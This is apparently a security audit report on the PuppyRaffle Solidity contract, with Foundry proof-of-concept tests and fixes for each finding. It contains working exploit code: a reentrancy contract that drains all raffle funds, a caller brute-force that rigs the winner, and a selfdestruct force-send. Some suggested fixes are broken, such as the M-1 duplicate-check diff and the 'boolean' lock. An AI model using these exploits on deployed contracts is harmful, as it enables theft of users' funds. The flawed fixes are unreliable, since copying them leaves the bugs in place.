### [H-1] Executing a reentrancy attack from an external contract allows to drain all the ether deposited in the raffle.

IMPACT: HIGH
LIKELIHOOD: HIGH

**Description:** The function `PupplyRaffle::refund` can be attacked using reentrancy.

**Impact:** All contract funds can be drained ejecuting reentrancy in the `PupplyRaffle::refund` function.

**Proof of Concept:** 

If 100 users enters de raffle, and a malicious contract enters after and requests the refund executing reentrancy, all the funds will be drained.

- PuppyRaffle balance before attack: 100
- ReentrancyAttacker balance before attack: 1
  
- PuppyRaffle balance after attack: 0
- ReentrancyAttacker balance after attack: 101

<details>
<summary>PoC</summary>
Place the following test and contract at `PuppyRaffleTest.t.sol`

```javascript
    function test_reentracyRefund() public {
        ReentrancyAttacker reentrancyAttackerContract;
        reentrancyAttackerContract = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(reentrancyAttackerContract), 1 ether);

        // Let's enter 100 players
        uint256 playersNumber = 100;
        address[] memory players = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            players[i] = address(i);
        }
        
        // Enter 100 players to the raffle
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);

        // Check balance before the attack
        console.log("PuppyRaffle balance before attack:", address(puppyRaffle).balance / 1e18);
        console.log("ReentrancyAttacker balance before attack:", address(reentrancyAttackerContract).balance / 1e18);
        console.log("-------------------");

        // Reentrancy attack contract starts the attack
        reentrancyAttackerContract.attack();

        // Check balance after attack
        console.log("PuppyRaffle balance after attack:", address(puppyRaffle).balance / 1e18);
        console.log("ReentrancyAttacker balance after attack:", address(reentrancyAttackerContract).balance / 1e18);
        console.log("-------------------");

        // Check the reentrancy attack count
        console.log("Reentrancy attack count:", reentrancyAttackerContract.attackCount());

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(reentrancyAttackerContract).balance, 101 ether);
        assertEq(reentrancyAttackerContract.attackCount(), 101);
    }

    contract ReentrancyAttacker {
        PuppyRaffle puppyRaffleContract;
        uint256 public entraceFee;
        uint256 public playerIndex;
        
        uint256 public attackCount;

        constructor(PuppyRaffle _puppyRaffleContract) {
            puppyRaffleContract = _puppyRaffleContract;
            entraceFee = puppyRaffleContract.entranceFee();
        }

        function attack() public {
            // Enter the raffle
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffleContract.enterRaffle{value: entraceFee}(players);
            // Refund the entrance fee & start attack
            playerIndex = puppyRaffleContract.getActivePlayerIndex(address(this));
            puppyRaffleContract.refund(playerIndex);
        }

        function _stealMoney() internal {
            attackCount++;
            if (address(puppyRaffleContract).balance >= entraceFee) {
                puppyRaffleContract.refund(playerIndex);
            }
        }

        receive() external payable {
            _stealMoney();
        }

        fallback() external payable {
            _stealMoney();
        }
    }
```
</details>

**Recommended Mitigation:** There are several ways to fix the reentrancy.

- Using CEI (Check - Effect - Interaction) Pattern.
```diff
    function refund(uint256 playerIndex) public {
+       // Check
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       // Effect
-       payable(msg.sender).sendValue(entranceFee);
+       players[playerIndex] = address(0);

+       // Interaction
-       players[playerIndex] = address(0);
+       payable(msg.sender).sendValue(entranceFee);
        
        emit RaffleRefunded(playerAddress);
    }
```

- Using lock boolean as execution function condition.
```diff
+   boolean locked;
    function refund(uint256 playerIndex) public {
+       require(!locked, "Reentrancy is locked");
+       locked = true;
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        
        emit RaffleRefunded(playerAddress);
+       locked = false;
    }
```

- Using Openzeppelin ReentrancyGuard Contract (https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
  

### [H-2] Weak on-chain randomness allows an attacker to influence the raffle winner and the minted puppy rarity.

IMPACT: HIGH
LIKELIHOOD: MEDIUM

**Description:** The `PupplyRaffle::selectWinner` uses predictable / manipulable on-chain values to generate randomness.

- Winner index RNG: `uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`
- Rarity RNG: `uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;`

Because `msg.sender` is controlled by the caller and block values can be influenced by block producers, this RNG is not suitable for a fair raffle.

**Impact:** A motivated attacker (or a miner / builder / MEV searcher) can bias the selection, winning the prize pool more often than expected and also biasing the rarity distribution.

**Proof of Concept:**

When the raffle is drawable, the attacker can compute the outcome for different caller addresses (EOAs / smart wallets) and only call `selectWinner` from an address that results in the attacker being selected, or coordinate with a builder to include a favorable timestamp.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_weakRandomness_bruteforceCallerToPickWinner() public {
        // Deploy a fresh raffle with short duration
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(123), 0);

        // Enter 4 players, with the attacker at index 0
        address attacker = address(1337);
        address[] memory players = new address[](4);
        players[0] = attacker;
        players[1] = address(1);
        players[2] = address(2);
        players[3] = address(3);

        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(players);

        // Make the raffle drawable
        vm.warp(1_000);
        // If your forge version supports it, fix difficulty to make this fully deterministic
        // vm.difficulty(2);

        // Brute force a caller address that results in winnerIndex == 0
        address caller;
        for (uint256 i = 10; i < 10_000; i++) {
            address candidate = address(uint160(i));
            uint256 winnerIndex = uint256(
                keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))
            ) % 4;
            if (winnerIndex == 0) {
                caller = candidate;
                break;
            }
        }
        assertTrue(caller != address(0));

        // Call selectWinner from the chosen caller
        vm.prank(caller);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker);
    }
```
</details>

**Recommended Mitigation:** Use a verifiable randomness source (e.g. Chainlink VRF), or a commit-reveal scheme, and avoid using `block.timestamp/block.difficulty` as the sole randomness source.

High-level sketch (VRF / commit-reveal): ensure `selectWinner()` consumes an unbiasable `randomWord` instead of locally-derived entropy.

```diff
-    uint256 winnerIndex =
-        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+    uint256 winnerIndex = randomWord % players.length;
@@
-    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
+    uint256 rarity = uint256(keccak256(abi.encodePacked(randomWord, tokenId))) % 100;
```


### [M-1] Looping through player array to check for duplicates in the  `PupplyRaffle::enterRaffle` is a potencial denial of servide (DoS) attack, incrementing gas cost for future entrants.

IMPACT: MEDIUM
LIKELIHOOD: MEDIUM

**Description:** The `PupplyRaffle::enterRaffle` funciton loops through the `PupplyRaffle::players` array to check for duplicates. However, the longer the `PupplyRaffle::players` is the more check a new player will have to make. This means that the gas cost for players who entry early will be dramatically lower than those who enter late. Every aditional player entry in the array increase the gas cost of the transaction.

**Impact:** The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouragin later users from entering, and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker might make the `PupplyRaffle::players` array so big, that no one else enters, guarenteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas cost will be such:

- 1st 100 players: ~6503265 gas.
- 2nd 100 players: ~18995512 gas.

This is more than 3x time expensive for the second 100 players set.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_dnialOfService() public {
        // Let's enter 100 players
        uint256 playersNumber = 100;
        address[] memory players = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            players[i] = address(i);
        }
        
        // Set a non-zero gas price for this test
        uint256 customGasPrice = 1 gwei;
        vm.txGasPrice(customGasPrice);
        
        // see how much gas it takes to enter 100 players
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsed = gasStart - gasEnd;
        uint256 gasCost = gasUsed * tx.gasprice;
        
        console.log("Gas cost for 100 players:", gasCost / 1e9);

        // Now for the second 100 players
        address[] memory playersTwo = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            playersTwo[i] = address(i + playersNumber);
        }
        
        // see how much gas it takes to enter 100 players
        uint256 gasStartTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(playersTwo);
        uint256 gasEndTwo = gasleft();
        uint256 gasUsedTwo = gasStartTwo - gasEndTwo;
        uint256 gasCostTwo = gasUsedTwo * tx.gasprice;
        
        console.log("Gas used for sencond 100 players:", gasCostTwo / 1e9);
    }
```
</details>
  
**Recommended Mitigation:** There are few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+   uint256 public raffleId;
+   mapping(address => uint256) public addressToRaffleId;

    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;

        rarityToUri[COMMON_RARITY] = commonImageUri;
        rarityToUri[RARE_RARITY] = rareImageUri;
        rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;

        rarityToName[COMMON_RARITY] = COMMON;
        rarityToName[RARE_RARITY] = RARE;
        rarityToName[LEGENDARY_RARITY] = LEGENDARY;

+       raffleId = 1;
    }

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
-       for (uint256 i = 0; i < newPlayers.length; i++) {
-           players.push(newPlayers[i]);
-       }
        for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+          players.push(newPlayers[i]);
        }
    }

    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+      raffleId++;
    }
```


### [M-2] Fee accounting uses `uint64 totalFees` and truncates `fee`, which can overflow and lock withdrawals.

IMPACT: MEDIUM
LIKELIHOOD: MEDIUM

**Description:** In `PupplyRaffle::selectWinner` the fee is computed as `uint256 fee = (totalAmountCollected * 20) / 100;` but it is accumulated into `uint64 totalFees` via `totalFees = totalFees + uint64(fee);`.

This downcast truncates the upper bits and in Solidity 0.7.x arithmetic does not revert on overflow. If fees ever exceed `type(uint64).max`, `totalFees` will wrap and become incorrect.

**Impact:** Fee accounting becomes incorrect and `PuppyRaffle::withdrawFees()` can become permanently unusable, because it requires `address(this).balance == uint256(totalFees)`.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_totalFeesUint64Truncation_breaksWithdrawFees() public {
        // 10 ether entrance fee, 10 players => total 100 ether
        // fee = 20 ether, which is > type(uint64).max (~18.4 ether)
        PuppyRaffle raffle = new PuppyRaffle(10 ether, address(123), 0);

        address[] memory players = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            players[i] = address(uint160(i + 1));
        }

        vm.deal(address(this), 100 ether);
        raffle.enterRaffle{value: 100 ether}(players);

        // Draw winner (duration = 0)
        raffle.selectWinner();

        // Contract should hold exactly 20 ether in fees
        assertEq(address(raffle).balance, 20 ether);

        // But totalFees is uint64 and was truncated/wrapped
        uint256 trackedFees = uint256(raffle.totalFees());
        assertTrue(trackedFees != 20 ether);

        // withdrawFees() now reverts because balance != totalFees
        vm.expectRevert();
        raffle.withdrawFees();
    }
```
</details>

**Recommended Mitigation:**

Change `totalFees` to `uint256` and remove the downcast.

```diff
-    uint64 public totalFees = 0;
+    uint256 public totalFees = 0;
@@
-        uint256 fee = (totalAmountCollected * 20) / 100;
-        totalFees = totalFees + uint64(fee);
+        uint256 fee = (totalAmountCollected * 20) / 100;
+        totalFees = totalFees + fee;
```

If storage packing is desired, enforce a hard cap (revert if `fee` would not fit into `uint64`) and document it.


### [M-3] Using `address(this).balance == totalFees` makes `withdrawFees()` vulnerable to forced ETH and can lock fees.

IMPACT: MEDIUM
LIKELIHOOD: MEDIUM

**Description:** `PuppyRaffle::withdrawFees()` assumes the contract balance equals the tracked fees:

`require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");`

However, ETH can be forced into a contract. This breaks the equality check.

**Impact:** If any extra ETH is present, the fees can become permanently stuck (cannot be withdrawn) even when there are no active players.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    contract ForceSend {
        constructor() payable {}
        function boom(address payable to) external {
            selfdestruct(to);
        }
    }

    function test_forcedEth_breaksWithdrawFeesInvariant() public {
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(123), 0);

        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);

        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(players);
        raffle.selectWinner();

        // Fee should be 0.8 ether (fits in uint64)
        assertEq(address(raffle).balance, 0.8 ether);

        // Force-send 1 wei to break the strict equality check
        ForceSend fs = new ForceSend{value: 1}();
        fs.boom(payable(address(raffle)));

        assertEq(address(raffle).balance, 0.8 ether + 1);
        vm.expectRevert();
        raffle.withdrawFees();
    }
```
</details>

**Recommended Mitigation:**

Gate withdrawals with raffle state (`players.length == 0`) instead of strict balance equality.

```diff
 function withdrawFees() external {
-    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+    require(players.length == 0, "PuppyRaffle: There are currently players active!");
     uint256 feesToWithdraw = totalFees;
     totalFees = 0;
     // slither-disable-next-line arbitrary-send-eth
     (bool success,) = feeAddress.call{value: feesToWithdraw}("");
     require(success, "PuppyRaffle: Failed to withdraw fees");
 }
```

Optionally: keep explicit accounting and ensure withdrawals do not depend on strict `address(this).balance == totalFees` equality.

### [L-1] Request getActivePlayerIndex through `PuppyRaffle::getActivePlayerIndex()` returns 0 both when the user is not in the array and when the user is the first player that entered on the raffle. The player might think they are not active.

**Description:** If the first player request their player index, they will get 0, on the same way that if they are not participating.

**Impact:** The player might think they are not participating in the raffle.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_getFirstActivePlayerIndex() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 firstActivePlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        uint256 noActivePlayer = puppyRaffle.getActivePlayerIndex(playerTwo);
        // Player one is the first active player
        assertEq(puppyRaffle.players(0), playerOne);
        // The returned index for active player1 is 0
        assertEq(firstActivePlayer, 0);
        // The returned index for non-active player2 is 0
        assertEq(noActivePlayer, 0);
    }
```
</details>

**Recommended Mitigation:**

- Return a pair of values (uint256 index, bool found)

```diff
-   function getActivePlayerIndex(address player) external view returns (uint256) {
+   function getActivePlayerIndex(address player) external view returns (uint256, bool) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
-               return i;
+               return (i, true);
            }
        }
-       return 0;
+       return (0, false);
    }
```


### [L-2] `enterRaffle()` allows an empty `newPlayers` array.

**Description:** If `newPlayers.length == 0`, the check becomes `require(msg.value == 0)` and the function emits `RaffleEnter(newPlayers)` without adding players.

**Impact:** Users can spam events cheaply and downstream indexers/UIs might treat this as a valid raffle entry.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_enterRaffle_allowsEmptyArrayAndZeroValue() public {
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(123), 0);

        address[] memory empty = new address[](0);

        // With an empty array, msg.value == entranceFee * 0 == 0
        // This call succeeds but does not add any players.
        raffle.enterRaffle{value: 0}(empty);
    }
```
</details>

**Recommended Mitigation:** Add a non-empty check.

```diff
 function enterRaffle(address[] memory newPlayers) public payable {
+    require(newPlayers.length > 0, "PuppyRaffle: newPlayers array must not be empty");
     require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
     for (uint256 i = 0; i < newPlayers.length; i++) {
         players.push(newPlayers[i]);
     }
 }
```

### [L-3] Missing zero address checks for `feeAddress` can lead to lost fees.

**Description:** Both the constructor and `changeFeeAddress()` allow `feeAddress = address(0)`.

**Impact:** Fees can be sent to the zero address (effectively burned).

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_feeAddressZero_burnsWithdrawnFees() public {
        // Deploy with feeAddress = address(0)
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(0), 0);

        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);

        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(players);
        raffle.selectWinner();

        uint256 zeroBefore = address(0).balance;
        raffle.withdrawFees();

        // 20% of 4 ether = 0.8 ether is sent to address(0)
        assertEq(address(0).balance, zeroBefore + 0.8 ether);
    }
```
</details>

**Recommended Mitigation:** Add `address(0)` checks in both constructor and `changeFeeAddress()`.

```diff
 constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
     entranceFee = _entranceFee;
+    require(_feeAddress != address(0), "PuppyRaffle: feeAddress cannot be zero");
     feeAddress = _feeAddress;
     raffleDuration = _raffleDuration;
     raffleStartTime = block.timestamp;
 }
@@
 function changeFeeAddress(address newFeeAddress) external onlyOwner {
+    require(newFeeAddress != address(0), "PuppyRaffle: feeAddress cannot be zero");
     feeAddress = newFeeAddress;
     emit FeeAddressChanged(newFeeAddress);
 }
```


### [L-4] `selectWinner()` does not follow a strict CEI / pull-payments pattern.

**Description:** `selectWinner()` transfers ETH using `winner.call{value: prizePool}("")` which executes arbitrary code on the winner.

**Impact:** Harder to reason about and increases attack surface.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test and helper contract into `PuppyRaffleTest.t.sol`.

```javascript
    contract ReenteringWinner {
        PuppyRaffle raffle;
        constructor(PuppyRaffle _raffle) {
            raffle = _raffle;
        }

        receive() external payable {
            // Re-enter during payout: become the first player of the *next* raffle
            address[] memory players = new address[](1);
            players[0] = address(this);
            raffle.enterRaffle{value: raffle.entranceFee()}(players);
        }
    }

    function test_selectWinner_externalCallAllowsReentryIntoEnterRaffle() public {
        PuppyRaffle raffle = new PuppyRaffle(1 ether, address(123), 0);

        ReenteringWinner rw = new ReenteringWinner(raffle);

        // Enter 4 players including the reentering contract
        address[] memory players = new address[](4);
        players[0] = address(rw);
        players[1] = address(1);
        players[2] = address(2);
        players[3] = address(3);

        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(players);

        // Pick a caller address that makes winnerIndex == 0 (so rw wins)
        address caller;
        vm.warp(1_000);
        for (uint256 i = 10; i < 10_000; i++) {
            address candidate = address(uint160(i));
            uint256 winnerIndex = uint256(
                keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))
            ) % 4;
            if (winnerIndex == 0) {
                caller = candidate;
                break;
            }
        }
        assertTrue(caller != address(0));

        vm.prank(caller);
        raffle.selectWinner();

        // Even though selectWinner() deletes players, rw re-enters during payout and adds itself back
        // so the next raffle starts with rw already entered.
        assertEq(raffle.players(0), address(rw));
    }
```
</details>

**Recommended Mitigation:** Use pull-payments for prize claims or apply a strict CEI flow.

If keeping push-payments, prevent re-entry into `enterRaffle()` while a winner is being selected.

```diff
+    bool private selectingWinner;
@@
 function enterRaffle(address[] memory newPlayers) public payable {
+    require(!selectingWinner, "PuppyRaffle: selecting winner");
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
@@
 function selectWinner() external {
+    selectingWinner = true;
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
@@
    _safeMint(winner, tokenId);
+    selectingWinner = false;
 }
```


### [G-1] Several storage variables could be constants/immutables to reduce gas.

**Description:**

- `raffleDuration` is set once and never changed; it can be `immutable`.
- `commonImageUri`, `rareImageUri`, `legendaryImageUri` are literals; they can be `constant` to avoid storage reads.

**Impact:** Lower deployment and runtime gas costs.

**Recommended Mitigation:** Convert eligible variables to `constant`/`immutable`.


### [G-2] Cache `players.length` in loops to save gas.

**Description:** In `enterRaffle()` the duplicate check reads `players.length` repeatedly.

**Impact:** Extra gas per loop iteration.

**Recommended Mitigation:** Cache `uint256 playersLength = players.length;` before iterating.


### [I-1] Solidity pragma should be specific, not wide

**Description:** 

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

```solidity
pragma solidity ^0.7.6;
```


### [I-2] Using Solidity 0.7.x misses built-in overflow checks and other safety improvements.

**Description:** The project uses `pragma solidity ^0.7.6;`. Solidity 0.8.x introduces checked arithmetic by default and other improvements.

**Impact:** Increased risk of silent overflows and harder auditing.

**Recommended Mitigation:** Upgrade to Solidity 0.8.x (and update dependencies) or use SafeMath everywhere.


### [I-3] `selectWinner()` uses derived accounting instead of `address(this).balance` and can become inconsistent.

**Description:** The contract uses `uint256 totalAmountCollected = players.length * entranceFee;`.

This can diverge from the real balance due to refunds, forced ETH, or other edge cases.

**Impact:** Miscomputed prize/fees, or incorrect assumptions in later logic.

**Recommended Mitigation:** Use `address(this).balance` for payout calculations, or maintain explicit accounting that updates on enter/refund.


### [I-4] Magic numbers and magic strings reduce readability and increase risk of mistakes.

**Description:** `80/20/100` payout constants and repeated rarity/name strings are embedded inline.

**Impact:** Higher maintenance risk.

**Recommended Mitigation:** Introduce named constants (e.g. `PRIZE_POOL_PERCENTAGE`, `FEE_PERCENTAGE`, `POOL_PRECISION`) and keep string literals as constants.


### [I-5] Missing events for important state changes.

**Description:** `selectWinner()` and `withdrawFees()` perform key actions (winner selection, fee withdrawal) without emitting events.

**Impact:** Harder off-chain monitoring, indexing, and debugging.

**Recommended Mitigation:** Emit events such as `WinnerSelected(winner, tokenId, prizePool, fee)` and `FeesWithdrawn(feeAddress, amount)`.


### [I-6] Unused function `_isActivePlayer()` is dead code.

**Description:** `_isActivePlayer()` is not used.

**Impact:** Maintenance overhead.

**Recommended Mitigation:** Remove it or use it where intended.


### [I-7] Test coverage is low.

**Description:** The test suite does not cover several edge cases (randomness manipulation assumptions, fee accounting, forced ETH, etc.).

**Impact:** Bugs can ship unnoticed.

**Recommended Mitigation:** Add tests for accounting invariants and adversarial scenarios.


### [I-8] Naming conventions for immutables / storage variables are inconsistent.

**Description:** Many Solidity style guides recommend prefixes like `i_` for immutables and `s_` for storage variables to make audits easier.

**Impact:** Readability only.

**Recommended Mitigation:** Adopt a consistent naming convention (optional).


### [I-9] `fee` can be computed as `totalAmountCollected - prizePool` to reduce duplication.

**Description:** `selectWinner()` computes both `prizePool` and `fee` using constants. `fee` can be derived as `totalAmountCollected - prizePool`.

**Impact:** Readability only.

**Recommended Mitigation:** Compute `fee = totalAmountCollected - prizePool` (optional).


### [I-10] `withdrawFees()` behavior and MEV considerations should be documented.

**Description:** The current implementation prevents fee withdrawal while players are active (and relies on a balance invariant). This affects when fees can be withdrawn and can be relevant in MEV/operational contexts.

**Impact:** Operational clarity.

**Recommended Mitigation:** Document the intended fee withdrawal policy and ensure the checks match that policy.